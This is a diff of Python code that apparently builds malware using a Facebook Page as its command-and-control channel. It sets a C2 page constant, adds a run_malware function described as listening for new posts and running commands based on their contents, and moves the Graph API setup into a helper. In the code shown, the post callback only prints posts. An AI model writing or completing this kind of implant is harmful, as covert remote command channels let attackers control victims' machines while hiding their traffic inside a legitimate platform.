@@ -11,10 +11,22 @@ STATIC_C2_PAGE = 'Hammer_6f5902ac237024bdd0c176cb93063dc4'
 
 def main():
     """Runs the program."""
-    print('Hello world')
-    graph = facebook.GraphAPI(
-        access_token=PAGE_LONG_ACCESS_TOKEN,
-        version='3.1')
+    #test_connectivity()
+    run_malware()
+
+
+def run_malware():
+    """Listens for new posts and runs commands based on their contents."""
+    graph = get_graph()
+    page_data = get_page_data(graph)
+    page_id = page_data['data'][0]['id']
+    wait_for_posts(graph, page_id, lambda post: print(post), verbose=True)
+
+
+def test_connectivity():
+    """Tests connectivity to the facebook GraphAPI for the user's page."""
+    print('Connecting to {0}'.format(STATIC_C2_PAGE))
+    graph = get_graph()
     page_data = get_page_data(graph)
     print(page_data['data'][0]['id'])
     page_id = page_data['data'][0]['id']
@@ -22,7 +34,13 @@ def main():
     print(posts)
     print(get_any_post(graph, page_id))
     print(get_last_post_data(graph, page_id))
-    wait_for_posts(graph, page_id, lambda post: print(post), verbose=True)
+    
+
+def get_graph():
+    """Returns the graph based on the access token."""
+    return facebook.GraphAPI(
+        access_token=PAGE_LONG_ACCESS_TOKEN,
+        version='3.1')
 
 
 def get_page_data(graph):
